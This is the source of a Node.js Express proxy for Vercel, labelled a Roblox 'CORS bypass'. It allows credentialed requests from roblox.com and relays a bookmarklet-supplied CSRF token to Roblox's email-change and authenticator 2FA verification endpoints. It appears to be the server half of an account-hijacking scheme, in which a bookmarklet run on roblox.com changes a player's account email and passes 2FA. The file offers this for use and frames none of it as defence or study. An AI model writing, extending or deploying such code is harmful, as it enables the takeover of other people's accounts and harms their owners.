   // Full proxy server code for Roblox CORS bypass (Node.js on Vercel)
   const express = require('express');
   const fetch = require('node-fetch');
   const app = express();

   // Parse JSON bodies
   app.use(express.json());

   // CORS Middleware: Allow requests from roblox.com
   app.use((req, res, next) => {
     res.header('Access-Control-Allow-Origin', 'https://www.roblox.com');
     res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
     res.header('Access-Control-Allow-Headers', 'Content-Type, x-csrf-token, Accept');
     res.header('Access-Control-Allow-Credentials', 'true');
     
     // Handle preflight OPTIONS requests
     if (req.method === 'OPTIONS') {
       res.sendStatus(200);
       return;
     }
     
     next();
   });

   // Proxy endpoint for changing email
   app.post('/api/change-email', async (req, res) => {
     try {
       const response = await fetch('https://accountsettings.roblox.com/v1/email', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json;charset=utf-8',
           'Accept': 'application/json, text/plain, */*',
           'x-csrf-token': req.headers['x-csrf-token']  // Forward the token from bookmarklet
         },
         body: JSON.stringify(req.body)  // Forward the body (e.g., { emailAddress: 'new@email.com' })
       });

       const data = await response.json();
       res.json(data);  // Send Roblox's response back
     } catch (error) {
       res.status(500).json({ error: 'Proxy error: ' + error.message });
     }
   });

   // Proxy endpoint for verifying 2FA (add more endpoints as needed)
   app.post('/api/verify-2fa', async (req, res) => {
     try {
       const { userId, challengeId, code } = req.body;
       const response = await fetch(`https://twostepverification.roblox.com/v1/users/${userId}/challenges/authenticator/verify`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json;charset=utf-8',
           'Accept': 'application/json, text/plain, */*',
           'x-csrf-token': req.headers['x-csrf-token']
         },
         body: JSON.stringify({ challengeId, code })
       });

       const data = await response.json();
       res.json(data);
     } catch (error) {
       res.status(500).json({ error: 'Proxy error: ' + error.message });
     }
   });

   // Export for Vercel (serverless)
   module.exports = app;
